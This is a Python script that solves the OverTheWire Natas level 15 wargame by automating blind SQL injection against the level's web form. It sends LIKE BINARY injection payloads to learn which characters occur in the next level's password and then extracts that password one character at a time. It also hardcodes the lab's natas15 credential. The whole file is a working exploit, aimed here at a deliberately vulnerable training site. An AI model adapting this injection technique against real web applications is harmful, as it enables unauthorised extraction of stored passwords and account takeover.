# Natas15 bruteforce script :)

import requests, string

url = "http://natas15.natas.labs.overthewire.org"
username = "natas15"
password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"

# Get the entire English alphabet (uppercase and lowercase) plus digits.
char_data = string.ascii_letters + string.digits
password_char_data = []

# ========= Step 1: Build a character dictionary =========
print("[*] Building character set...")
for char in char_data:
    injection = f'natas16" AND password LIKE BINARY "%{char}%" -- '
    response = requests.get(url, auth=(username, password), params={'username': injection})
    if "This user exists." in response.text:
        password_char_data.append(char)
        print(f"[+] Found valid character: {char}")

print("\n[✔] Character dictionary complete:")
print("".join(password_char_data))

# ========= Step 2: Brute-force the password =========
print("\n[*] Starting brute-force...")
natas16_password = ""

while len(natas16_password) < 32:  # Natas passwords are 32 characters, via the previous passwords.
    for char in password_char_data:
        attempt = natas16_password + char
        injection = f'natas16" AND password LIKE BINARY "{attempt}%" -- '
        response = requests.get(url, auth=(username, password), params={'username': injection})

        if "This user exists." in response.text:
            natas16_password += char
            print(f"[+] Password so far: {natas16_password}")


print("\n[✔] Your password for natas16:")
print(natas16_password)
